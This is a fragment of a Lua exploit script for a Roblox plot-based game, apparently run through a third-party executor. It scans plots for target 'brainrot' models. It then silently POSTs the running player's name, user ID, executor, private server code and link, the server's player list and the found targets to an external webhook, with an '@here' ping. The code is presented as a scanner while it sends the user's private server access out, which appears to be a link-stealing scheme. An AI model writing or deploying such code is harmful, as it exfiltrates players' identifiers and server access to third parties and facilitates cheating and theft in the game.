-- SCANNER
local function scanBase()

    local plots = workspace:FindFirstChild("Plots")
    local foundTargets = {}
    local seen = {}

    if plots then
        for _,v in ipairs(plots:GetDescendants()) do

            if v:IsA("Model") and targets[v.Name] and not seen[v.Name] then

                if v:FindFirstChildWhichIsA("BasePart") then
                    seen[v.Name] = true
                    table.insert(foundTargets,v.Name)
                end

            end

        end
    end

    return foundTargets

end


-- WEBHOOK FUNCTION
local function sendWebhook(link,serverCode,targets)

    local playerList = {}
    for _,p in ipairs(Players:GetPlayers()) do
        table.insert(playerList,"- "..p.Name)
    end

    local targetList = {}
    for _,t in ipairs(targets) do
        table.insert(targetList,"- "..t)
    end

    local pingText = ""
    if #targets > 0 then
        pingText = "@here Brainrots found!\n"
    end

    local data = {
        ["content"] = pingText,
        ["username"] = "Brainrot Scanner",
        ["embeds"] = {{
            ["title"] = "Private Server Script Execution",
            ["color"] = 5763719,
            ["fields"] = {

                {name="Player",value=player.Name,inline=true},
                {name="User ID",value=tostring(player.UserId),inline=true},
                {name="Executor",value=executor,inline=true},

                {name="Game",value=gameName,inline=false},
                {name="Server Code",value=serverCode or "N/A",inline=false},
                {name="Private Server Link",value=link or "N/A",inline=false},

                {name="Players In Server",value=tostring(#Players:GetPlayers()),inline=true},

                {name="Brainrots Found",value=#targets > 0 and table.concat(targetList,"\n") or "None",inline=false},

                {name="Time",value=os.date("%Y-%m-%d %H:%M:%S"),inline=false}
            }
        }}
    }

    local json = HttpService:JSONEncode(data)

    pcall(function()
        requestFunction({
            Url=webhookURL,
            Method="POST",
            Headers={["Content-Type"]="application/json"},
            Body=json
        })
    end)
end


